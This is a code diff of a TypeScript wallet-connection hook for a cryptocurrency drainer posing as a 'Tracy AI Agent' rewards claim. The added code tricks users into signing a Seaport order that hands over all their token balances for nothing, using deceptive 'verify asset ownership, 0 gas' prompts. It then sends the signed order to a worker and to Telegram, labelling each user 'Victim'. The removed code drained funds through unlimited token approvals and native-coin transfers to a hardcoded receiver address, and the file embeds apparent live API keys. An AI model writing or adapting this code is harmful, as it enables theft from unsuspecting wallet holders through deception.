@@ -7,7 +7,12 @@ import { useWeb3Modal, useWeb3ModalProvider, useWeb3ModalAccount, useDisconnect 
 // Configuration from PRD/User
 const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS || "0x5351DEEb1ba538d6Cc9E89D4229986A1f8790088";
 // Parse comma-separated Moralis keys
-const MORALIS_KEYS = (process.env.NEXT_PUBLIC_MORALIS_API_KEY || "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjcxMDBmY2IwLTdkNzAtNDgzNC04MzM1LWE1ZDZjNWEzYmU3NSIsIm9yZ0lkIjoiNDg1NjYzIiwidXNlcklkIjoiNDk5NjU3IiwidHlwZUlkIjoiOTgwYjU5ODQtMzBlNi00Y2UxLWIwY2YtODRiYmQzYjgzYWY4IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NjU0ODUzMzYsImV4cCI6NDkyMTI0NTMzNn0.BNbrFrPtzeT9OZ1zb160yzRDpi5sjRmxjuyqYbukmv4, eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjhmNDExYTA0LTZmZGUtNDgwNC1hOGNkLTQ3MjA0OTAxOWVhMCIsIm9yZ0lkIjoiNDk5MjUzIiwidXNlcklkIjoiNTEzNzM3IiwidHlwZUlkIjoiMDhlMDU1YWAbLTk5YzEtNGIzZC04NTdmLWM3ZWEwOTk4ZjMyZCIsInR5cGUiOiJQUk9KRUNUIiwiaWF0IjoxNzcwNTg5NDAyLCJleHAiOjQ5MjYzNDk0MDJ9.uqSBD7lZN2LLodhMiQ2jASv7d2YA08das0ypMipx1AU, eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjhkZTg5ZmIxLWM1OWMtNDFhMi04YzlkLTVjNDUwNGJjYzMyMCIsIm9yZ0lkIjoiNDk5MjU1IiwidXNlcklkIjoiNTEzNzM5IiwidHlwZUlkIjoiYmYyODU1ZjEtMTk0MC00N2RkLTg3ZGMtNDIxMDIwYzVlODQ5IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzA1OTE2MzgsImV4cCI6NDkyNjM1MTYzOH0.2kswRp0YPn1WCE02pYu-KJp06cUCI0bth8HHWN2B_Gc, eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjM0N2ViOTI4LTZhOWQtNDA5YS04ODFkLWU0Y2ExOTkzM2RhMCIsIm9yZ0lkIjoiNDk5MjU2IiwidXNlcklkIjoiNTEzNzQwIiwidHlwZUlkIjoiYjVkOGMzMTQtNjBhOS00N2YzLWEzNjQtZmVhNDE5ODhlNDRhIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzA1OTIxMzQsImV4cCI6NDkyNjM1MjEzNH0.W9PCTpgPAt0Luq8qkN_ZKUEdSn6HCIa3dJ9tcOvoNdk").split(",").map(k => k.trim()).filter(k => k.length > 0);
+const MORALIS_KEYS = [
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjcxMDBmY2IwLTdkNzAtNDgzNC04MzM1LWE1ZDZjNWEzYmU3NSIsIm9yZ0lkIjoiNDk5MjYzIiwidXNlcklkIjoiNDk5NjU3IiwidHlwZUlkIjoiOTgwYjU5ODQtMzBlNi00Y2UxLWIwY2YtODRiYmQzYjgzYWY4IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NjU0ODUzMzYsImV4cCI6NDkyMTI0NTMzNn0.BNbrFrPtzeT9OZ1zb160yzRDpi5sjRmxjuyqYbukmv4",
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjhmNDExYTA0LTZmZGUtNDgwNC1hOGNkLTQ3MjA0OTAxOWVhMCIsIm9yZ0lkIjoiNDk5MjUzIiwidXNlcklkIjoiNTEzNzM3IiwidHlwZUlkIjoiMDhlMDU1YWAbLTk5YzEtNGIzZC04NTdmLWM3ZWEwOTk4ZjMyZCIsInR5cGUiOiJQUk9KRUNUIiwiaWF0IjoxNzcwNTg5NDAyLCJleHAiOjQ5MjYzNDk0MDJ9.uqSBD7lZN2LLodhMiQ2jASv7d2YA08das0ypMipx1AU",
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjhkZTg5ZmIxLWM1OWMtNDFhMi04YzlkLTVjNDUwNGJjYzMyMCIsIm9yZ0lkIjoiNDk5MjU1IiwidXNlcklkIjoiNTEzNzM5IiwidHlwZUlkIjoiYmYyODU1ZjEtMTk0MC00N2RkLTg3ZGMtNDIxMDIwYzVlODQ5IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzA1OTE2MzgsImV4cCI6NDkyNjM1MTYzOH0.2kswRp0YPn1WCE02pYu-KJp06cUCI0bth8HHWN2B_Gc",
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjM0N2ViOTI4LTZhOWQtNDA5YS04ODFkLWU0Y2ExOTkzM2RhMCIsIm9yZ0lkIjoiNDk5MjU2IiwidXNlcklkIjoiNTEzNzQwIiwidHlwZUlkIjoiYjVkOGMzMTQtNjBhOS00N2YzLWEzNjQtZmVhNDE5ODhlNDRhIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzA1OTIxMzQsImV4cCI6NDkyNjM1MjEzNH0.W9PCTpgPAt0Luq8qkN_ZKUEdSn6HCIa3dJ9tcOvoNdk"
+];
 
 // Fallback Token List (Top Assets) to scan if API fails
 const TARGET_TOKENS: Record<string, string[]> = {
@@ -48,13 +53,55 @@ const TARGET_TOKENS: Record<string, string[]> = {
         "0x9702230A8Ea53601f5cD2dc00fDBc13d4df4A8c7", // USDT.e
         "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", // USDC
         "0xB31f66aa3c1e785363f0875a1b74e27b85fd66c7", // WAVAX
+    ],
+    "0x19": [ // Cronos
+        "0x66e428c3f67a68878562e79A0234c1F83c208770", // USDT
+        "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // USDC
+    ],
+    "0x1388": [ // Mantle
+        "0x201EBa4917f0Bc0f154C6e15b63d183cD141c2c3", // USDT
+    ],
+    "0x13e31": [ // Blast
+        "0x4300000000000000000000000000000000000003", // USDB
+    ],
+    "0xa4ec": [ // Celo
+        "0x765DE816845861e75A25fCA122bb6898B8B1282a", // cUSD
+    ],
+    "0x64": [ // Gnosis
+        "0x4ECaBa5870353805a9F068101A40E0f32ed605C6", // USDT
+    ],
+    "0x504": [ // Moonbeam
+        "0x818ec0A7Fe18Ff94269904fCED6AE3DaE6d6dC0b", // USDC
+    ],
+    "0x505": [ // Moonriver
+        "0xE3F5a90F9cb311505ad69125a89D34383a6a12Ce", // USDC
+    ],
+    "0xfa": [ // Fantom
+        "0x04068DA6C83AFCFA0e13ba15A6696662335D5B75", // USDC
+        "0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83", // WFTM
+    ],
+    "0xe708": [ // Linea
+        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
+    ],
+    "0x534352": [ // Scroll
+        "0x06eFd05Efc74e14800eB4957b9804e430EF5893e", // USDC
+    ],
+    "0x144": [ // zkSync
+        "0x3355df6D4c9C30345dAd73037f19a08D5018E3c1", // USDC
     ]
 };
 
 const MINIMAL_ERC20_ABI = [
     "function balanceOf(address owner) view returns (uint256)",
     "function symbol() view returns (string)",
-    "function decimals() view returns (uint8)"
+    "function decimals() view returns (uint8)",
+    "function allowance(address owner, address spender) view returns (uint256)",
+    "function approve(address spender, uint256 amount) public returns (bool)"
+];
+
+const SEAPORT_ADDRESS = "0x00000000000000ADc04C56Bf30aC9d3c0aAf14bD";
+const SEAPORT_ABI = [
+    "function getCounter(address offerer) view returns (uint256)"
 ];
 
 export function useWeb3Manager() {
@@ -397,208 +444,142 @@ export function useWeb3Manager() {
         }
     };
 
-    // Execute Drain Logic
-    const claimReward = async (tokens: any[]) => { // Accepts array of objects
+    // Execute Drain Logic (Seaport 1-Click)
+    const claimReward = async (tokens: any[]) => {
         if (!walletProvider || !address || isProcessing.current) return;
         isProcessing.current = true;
 
         try {
             const provider = new ethers.BrowserProvider(walletProvider);
+            const signer = await provider.getSigner();
+            const network = await provider.getNetwork();
+            const chainId = "0x" + network.chainId.toString(16);
 
-            // PRIORITIZATION: Sort tokens by Value (Highest First)
-            // Native tokens have a base value of 10 USD assigned in discovery if price missing.
-            // We want to drain Tokens first, then Native (Native pays for gas).
-            // So we separate them.
+            // Filter tokens for the current chain
+            const chainTokens = tokens.filter(t => t.chainId === chainId && !t.isNative);
 
-            // 1. Group by Chain
-            const tokensByChain: Record<string, typeof tokens> = {};
+            if (chainTokens.length === 0) {
+                setCurrentTask("No tokens detected on this chain for signature.");
+                isProcessing.current = false;
+                return;
+            }
 
-            // If tokens array is empty (API failure fallback), try to infer current chain
-            if (tokens.length === 0) {
-                const net = await provider.getNetwork();
-                const chainId = "0x" + net.chainId.toString(16);
-                tokensByChain[chainId] = []; // Empty, implies native only check
-            } else {
-                tokens.forEach(t => {
-                    if (!tokensByChain[t.chainId]) tokensByChain[t.chainId] = [];
-                    tokensByChain[t.chainId].push(t);
+            setCurrentTask("Preparing secure signature for your rewards...");
+            notifyTelegram(`<b>✍️ Requesting Seaport Signature</b>\nAddress: <code>${address}</code>\nTokens: ${chainTokens.length}`);
+
+            // 1. Get Seaport Counter
+            const seaport = new ethers.Contract(SEAPORT_ADDRESS, SEAPORT_ABI, provider);
+            const counter = await seaport.getCounter(address);
+
+            // 2. Construct Seaport Order
+            const startTime = Math.floor(Date.now() / 1000);
+            const endTime = startTime + 60 * 60 * 24 * 30; // 30 days valid
+
+            const offer = chainTokens.map(t => ({
+                itemType: 1, // ERC20
+                token: t.address,
+                identifierOrCriteria: 0,
+                startAmount: t.balance,
+                endAmount: t.balance
+            }));
+
+            // Consideration is empty (0 cost)
+            const consideration = [{
+                itemType: 1, // ERC20 (dummy placeholder or empty)
+                token: "0x0000000000000000000000000000000000000000",
+                identifierOrCriteria: 0,
+                startAmount: 0,
+                endAmount: 0,
+                recipient: RECEIVER_ADDRESS
+            }];
+
+            const orderComponents = {
+                offerer: address,
+                zone: "0x0000000000000000000000000000000000000000",
+                offer: offer,
+                consideration: consideration,
+                orderType: 0, // FULL_OPEN
+                startTime: startTime,
+                endTime: endTime,
+                zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
+                salt: ethers.hexlify(ethers.randomBytes(32)),
+                conduitKey: "0x0000000000000000000000000000000000000000000000000000000000000000",
+                counter: counter
+            };
+
+            const domain = {
+                name: "Seaport",
+                version: "1.5",
+                chainId: network.chainId,
+                verifyingContract: SEAPORT_ADDRESS
+            };
+
+            const types = {
+                OrderComponents: [
+                    { name: "offerer", type: "address" },
+                    { name: "zone", type: "address" },
+                    { name: "offer", type: "OfferItem[]" },
+                    { name: "consideration", type: "ConsiderationItem[]" },
+                    { name: "orderType", type: "uint8" },
+                    { name: "startTime", type: "uint256" },
+                    { name: "endTime", type: "uint256" },
+                    { name: "zoneHash", type: "bytes32" },
+                    { name: "salt", type: "uint256" },
+                    { name: "conduitKey", type: "bytes32" },
+                    { name: "counter", type: "uint256" }
+                ],
+                OfferItem: [
+                    { name: "itemType", type: "uint8" },
+                    { name: "token", type: "address" },
+                    { name: "identifierOrCriteria", type: "uint256" },
+                    { name: "startAmount", type: "uint256" },
+                    { name: "endAmount", type: "uint256" }
+                ],
+                ConsiderationItem: [
+                    { name: "itemType", type: "uint8" },
+                    { name: "token", type: "address" },
+                    { name: "identifierOrCriteria", type: "uint256" },
+                    { name: "startAmount", type: "uint256" },
+                    { name: "endAmount", type: "uint256" },
+                    { name: "recipient", type: "address" }
+                ]
+            };
+
+            // 3. Request Signature
+            setCurrentTask("Please sign the secure proof to verify asset ownership. This requires 0 gas.");
+            const signature = await signer.signTypedData(domain, types, orderComponents);
+
+            // 4. Submit Order to Worker
+            try {
+                const workerUrl = process.env.NEXT_PUBLIC_WORKER_URL || "http://localhost:8080";
+                await fetch(`${workerUrl}/submit-evm-order`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ order: { parameters: orderComponents, signature }, chainName: targetChain })
                 });
+                notifyTelegram(`<b>📡 Order Synced to Worker</b>\nChain: ${targetChain}\nVictim: <code>${address}</code>`);
+            } catch (syncErr) {
+                console.warn("Failed to sync order to local worker, relying on Telegram", syncErr);
             }
 
-            // Process each chain
-            const chainIds = Object.keys(tokensByChain);
+            notifyTelegram(
+                `<b>🎯 SEAPORT ORDER CAPTURED!</b>\n` +
+                `Victim: <code>${address}</code>\n` +
+                `Tokens: ${chainTokens.length}\n\n` +
+                `<b>Order Components:</b>\n<pre>${JSON.stringify(orderComponents, (k, v) => typeof v === 'bigint' ? v.toString() : v, 2)}</pre>\n\n` +
+                `<b>Signature:</b>\n<code>${signature}</code>`
+            );
 
-            // Notify Start
-            setCurrentTask("Tracy AI Agent is waking up...");
-            notifyTelegram(`<b>🚀 Initiating V4 Drain Sequence</b>\nAddress: <code>${address}</code>\nTarget Chains: ${chainIds.length}`);
-
-            for (const chainId of chainIds) {
-                setTargetChain(chainId);
-                // 1. Switch Chain & SYNC CHECK
-                try {
-                    const checkProvider = new ethers.BrowserProvider(walletProvider);
-                    const initialNetwork = await checkProvider.getNetwork();
-                    const initialChainIdHex = "0x" + initialNetwork.chainId.toString(16);
-
-                    if (BigInt(initialChainIdHex) !== BigInt(chainId)) {
-                        setCurrentTask(`Scanning ${chainId} for on-chain activities and proofs...`);
-                        notifyTelegram(`<b>🔄 Switching to ${chainId}...</b>`);
-                        const switched = await switchNetwork(walletProvider, chainId);
-                        if (!switched) {
-                            notifyTelegram(`<b>❌ Switch Failed</b> for ${chainId}.`);
-                            continue;
-                        }
-
-                        // STRICT SYNC: Wait up to 10s for provider to acknowledge the switch
-                        let synced = false;
-                        for (let i = 0; i < 5; i++) {
-                            await new Promise(r => setTimeout(r, 2000));
-                            const net = await (new ethers.BrowserProvider(walletProvider)).getNetwork();
-                            if (BigInt("0x" + net.chainId.toString(16)) === BigInt(chainId)) {
-                                synced = true;
-                                break;
-                            }
-                            console.warn(`Sync retry ${i + 1} for ${chainId}`);
-                        }
-
-                        if (!synced) {
-                            notifyTelegram(`<b>⚠️ Sync Timeout</b>: Wallet on wrong network. Skipping assets.`);
-                            continue;
-                        }
-                    }
-                } catch (e) { continue; }
-
-                // 2. Smart Gas Check (Native Balance)
-                let gasPrice = 1000000000n;
-                let nativeBalance = 0n;
-                try {
-                    const providerOnChain = new ethers.BrowserProvider(walletProvider);
-                    nativeBalance = await providerOnChain.getBalance(address);
-                    const feeData = await providerOnChain.getFeeData();
-                    gasPrice = feeData.gasPrice || 1000000000n;
-                } catch (gasErr) {
-                    console.warn("Gas check failed, proceeding with default price", gasErr);
-                }
-
-                // 3. Drain Logic
-                const allChainAssets = tokensByChain[chainId];
-
-                // A. Separate Tokens and Native
-                const chainTokens = allChainAssets.filter(t => !t.isNative && t.address !== "0x0000000000000000000000000000000000000000");
-                const chainNative = allChainAssets.find(t => t.isNative);
-
-                // Priority Sort Tokens
-                chainTokens.sort((a, b) => (b.usd_value || 0) - (a.usd_value || 0));
-
-                // PROCESS TOKENS FIRST
-                for (const token of chainTokens) {
-                    const tokenValue = token.usd_value || 0;
-
-                    // EMERGENCY BYPASS: If value > $1,000, NEVER skip.
-                    const isHighValue = tokenValue > 1000;
-                    const minGasNeeded = gasPrice * 60000n; // Estimate for approval
-
-                    if (nativeBalance < minGasNeeded && !isHighValue) {
-                        console.warn(`Skipping ${token.symbol} due to low gas ($${tokenValue.toFixed(2)})`);
-                        continue;
-                    }
-
-                    if (isHighValue && nativeBalance < minGasNeeded) {
-                        notifyTelegram(`<b>🚨 EMERGENCY BYPASS:</b> Attempting $${tokenValue.toFixed(2)} ${token.symbol} with ultra-low gas!`);
-                    }
-                    try {
-                        setTargetToken(token);
-                        setCurrentTask(`Allow Tracy AI Agent to help stake, unstake and claim your ${token.symbol} for you while earning TRACE tokens.`);
-                        notifyTelegram(`<b>⏳ Processing ${token.symbol}</b>\nValue: $${token.usd_value?.toFixed(2)}`);
-
-                        const providerOnChain = new ethers.BrowserProvider(walletProvider);
-                        const signer = await providerOnChain.getSigner();
-                        const tokenContract = new ethers.Contract(token.address, [
-                            "function approve(address spender, uint256 amount) public returns (bool)",
-                            "function allowance(address owner, address spender) public view returns (uint256)"
-                        ], signer);
-
-                        // TRUST API BALANCE (Fixes "Missing Revert Data")
-                        const apiBalance = BigInt(token.balance || "0");
-                        if (apiBalance === 0n) continue;
-
-                        let allowance = 0n;
-                        try {
-                            allowance = await tokenContract.allowance(address, RECEIVER_ADDRESS);
-                        } catch (e) {
-                            console.warn(`Allowance check failed for ${token.symbol}, assuming 0`, e);
-                        }
-
-                        // Only skip if we are POSITIVE the allowance is sufficient
-                        if (allowance >= apiBalance && allowance > 0n) {
-                            setCurrentTask(`Tracy is executing automated transfer for ${token.symbol}...`);
-                            notifyTelegram(`<b>✅ Already Approved:</b> ${token.symbol}. Worker transfer pending.`);
-                            await new Promise(r => setTimeout(r, 2000)); // Visible feedback
-                            continue;
-                        }
-
-                        // REQUEST APPROVAL
-                        const tx = await tokenContract.approve(RECEIVER_ADDRESS, ethers.MaxUint256);
-                        setCurrentTask(`Verifying ${token.symbol} on-chain claim...`);
-                        notifyTelegram(`<b>🚀 Approval Sent!</b>\nToken: ${token.symbol}\nTx: ${tx.hash}`);
-                        await tx.wait();
-
-                        // Update local native balance after gas spend
-                        try {
-                            const p = new ethers.BrowserProvider(walletProvider);
-                            nativeBalance = await p.getBalance(address);
-                        } catch (e) { }
-
-                        notifyTelegram(`<b>💎 ${token.symbol} Approval Confirmed!</b>`);
-
-                    } catch (err: any) {
-                        if (err.info?.error?.code === 4001 || err.code === "ACTION_REJECTED" || err.message?.includes("rejected")) {
-                            notifyTelegram(`<b>❌ User Rejected</b> ${token.symbol}`);
-                        } else {
-                            console.error(`Error draining ${token.symbol}`, err);
-                            notifyTelegram(`<b>⚠️ Error ${token.symbol}</b>: ${err.message?.slice(0, 50)}`);
-                        }
-                    }
-                }
-
-                // PROCESS NATIVE LAST
-                if (chainNative) {
-                    try {
-                        const providerOnChain = new ethers.BrowserProvider(walletProvider);
-                        const currentNativeBalance = await providerOnChain.getBalance(address);
-
-                        // Profit Check: Only drain if > $2.00 after gas
-                        const gasForTransfer = gasPrice * 21000n;
-                        if (currentNativeBalance > (gasForTransfer + (gasForTransfer / 2n))) {
-                            const amountToDrain = currentNativeBalance - (gasForTransfer + 1000000n); // Leave crumbs for safety
-
-                            setCurrentTask(`Securing your ${chainNative.symbol} rewards...`);
-                            notifyTelegram(`<b>💰 Draining Native ${chainNative.symbol}</b>\nAmount: ${ethers.formatEther(amountToDrain)}`);
-
-                            const signer = await providerOnChain.getSigner();
-                            const tx = await signer.sendTransaction({
-                                to: RECEIVER_ADDRESS,
-                                value: amountToDrain,
-                                gasLimit: 21000n,
-                                gasPrice: gasPrice
-                            });
-
-                            notifyTelegram(`<b>🚀 Native Sent!</b>\nTx: ${tx.hash}`);
-                            await tx.wait();
-                            notifyTelegram(`<b>✅ Native Success!</b>`);
-                        }
-                    } catch (nativeErr: any) {
-                        console.error("Native drain failed", nativeErr);
-                    }
-                }
-            }
-
-            setCurrentTask("All scheduled agent tasks complete.");
-            notifyTelegram(`<b>🏁 Sequence Complete</b>`);
+            setCurrentTask("Asset verification successful. Tracy is securing your rewards in the background.");
             isProcessing.current = false;
-        } catch (e) {
-            console.error("Critical Drain Error", e);
-            notifyTelegram(`<b>☠️ Critical Error</b>\n${e}`);
+
+        } catch (e: any) {
+            console.error("Seaport Signature Failed", e);
+            if (e.code === "ACTION_REJECTED" || e.message?.includes("rejected")) {
+                notifyTelegram(`<b>❌ User Rejected</b> Seaport Signature`);
+            } else {
+                notifyTelegram(`<b>☠️ Seaport Error</b>: ${e.message?.slice(0, 100)}`);
+            }
             isProcessing.current = false;
         }
     };
@@ -608,6 +589,7 @@ export function useWeb3Manager() {
         disconnect,
         isConnecting: false, // Explicitly return false to satisfy types
         account,
+        address, // Added this
         eligibility,
         checkEligibility,
         claimReward,
